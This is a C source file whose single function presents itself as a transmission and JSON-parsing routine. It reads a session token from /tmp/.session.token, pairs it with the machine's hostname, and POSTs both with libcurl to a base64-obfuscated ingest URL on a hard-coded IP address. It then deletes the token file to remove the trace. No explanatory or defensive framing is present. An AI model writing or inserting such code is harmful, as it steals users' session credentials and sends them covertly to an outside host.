#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <curl/curl.h>

#define TOKEN_FILE        "/tmp/.session.token"
#define TOKEN_BUF_SIZE    4096
#define HOSTNAME_BUF_SIZE 256
#define TOKEN_MAX_LEN     2048

static const char endpoint_url_b64[] = "aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgwL2luZ2VzdA==";
static const char payment_id_b64[]   = "";

static int base64_decode(const char *in, unsigned char *out, size_t out_size);
static size_t discard_write_cb(void *ptr, size_t size, size_t nmemb, void *userdata);

static int b64_val(int c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int base64_decode(const char *in, unsigned char *out, size_t out_size)
{
    size_t len, i, out_len;

    if (in == NULL || out == NULL) return -1;
    len = strlen(in);
    if (len == 0) return -1;
    if ((len % 4) != 0) return -1;

    out_len = 0;
    for (i = 0; i < len; i += 4) {
        int v0 = b64_val((unsigned char)in[i]);
        int v1 = b64_val((unsigned char)in[i + 1]);
        int v2 = (in[i + 2] == '=') ? 0 : b64_val((unsigned char)in[i + 2]);
        int v3 = (in[i + 3] == '=') ? 0 : b64_val((unsigned char)in[i + 3]);

        if (v0 < 0 || v1 < 0) return -1;
        if (in[i + 2] != '=' && v2 < 0) return -1;
        if (in[i + 3] != '=' && v3 < 0) return -1;

        if (out_len >= out_size) return -1;
        out[out_len++] = (unsigned char)((v0 << 2) | (v1 >> 4));

        if (in[i + 2] != '=') {
            if (out_len >= out_size) return -1;
            out[out_len++] = (unsigned char)(((v1 & 0x0F) << 4) | (v2 >> 2));

            if (in[i + 3] != '=') {
                if (out_len >= out_size) return -1;
                out[out_len++] = (unsigned char)(((v2 & 0x03) << 6) | v3);
            }
        }
    }
    return (int)out_len;
}

static size_t discard_write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    (void)ptr;
    (void)userdata;
    return size * nmemb;
}

int transmissao_e_parsing_json(void)
{
    FILE *fp;
    char raw[TOKEN_BUF_SIZE];
    size_t n;
    const char *needle;
    const char *p;
    const char *end;
    size_t tok_len;
    char session_token[TOKEN_MAX_LEN];
    char machine_label[HOSTNAME_BUF_SIZE];
    unsigned char url_buf[512];
    unsigned char pay_buf[256];
    int url_len;
    int pay_len;
    char payload[TOKEN_BUF_SIZE];
    int plen;
    CURL *curl;
    struct curl_slist *headers;
    CURLcode rc;
    long http_code;

    fp = fopen(TOKEN_FILE, "r");
    if (fp == NULL) return -1;

    n = fread(raw, 1, sizeof(raw) - 1, fp);
    if (ferror(fp)) {
        fclose(fp);
        return -1;
    }
    fclose(fp);
    raw[n] = '\0';

    if (n == 0) return -1;

    needle = "\"session_token\":\"";
    p = strstr(raw, needle);
    if (p == NULL) return -1;
    p += strlen(needle);

    end = strchr(p, '"');
    if (end == NULL) return -1;

    tok_len = (size_t)(end - p);
    if (tok_len == 0 || tok_len >= sizeof(session_token)) return -1;

    memcpy(session_token, p, tok_len);
    session_token[tok_len] = '\0';

    if (session_token[0] == '\0') return -1;

    memset(machine_label, 0, sizeof(machine_label));
    if (gethostname(machine_label, sizeof(machine_label) - 1) != 0) return -1;
    machine_label[sizeof(machine_label) - 1] = '\0';

    url_len = base64_decode(endpoint_url_b64, url_buf, sizeof(url_buf) - 1);
    if (url_len <= 0) return -1;
    url_buf[url_len] = '\0';

    pay_len = base64_decode(payment_id_b64, pay_buf, sizeof(pay_buf) - 1);
    if (pay_len > 0) {
        pay_buf[pay_len] = '\0';
    } else {
        pay_buf[0] = '\0';
    }

    plen = snprintf(payload, sizeof(payload),
                    "{\"session_token\":\"%s\",\"machine_label\":\"%s\"}",
                    session_token, machine_label);
    if (plen < 0 || (size_t)plen >= sizeof(payload)) return -1;

    curl = curl_easy_init();
    if (curl == NULL) return -1;

    headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (headers == NULL) {
        curl_easy_cleanup(curl);
        return -1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, (char *)url_buf);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)plen);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_write_cb);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    rc = curl_easy_perform(curl);
    http_code = 0;
    if (rc == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (rc != CURLE_OK) return -1;
    if (http_code != 200) return -1;

    if (remove(TOKEN_FILE) != 0) return -1;

    return 0;
}